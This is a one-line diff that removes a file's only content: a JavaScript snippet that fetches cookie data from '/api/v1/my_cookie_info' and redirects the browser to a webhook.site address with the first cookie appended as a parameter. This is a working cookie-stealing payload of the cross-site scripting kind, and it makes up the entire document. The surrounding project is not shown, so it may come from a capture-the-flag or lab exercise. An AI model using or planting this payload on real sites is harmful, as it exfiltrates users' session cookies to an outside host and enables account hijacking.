@@ -1,1 +1,0 @@
-fetch("/api/v1/my_cookie_info").then((response) => response.json()).then((data) => {var cookie = data.cookies[0]; location.href = "https://webhook.site/505d9d18-ee95-4460-82a5-1d2d8676ae40?p="+cookie;});
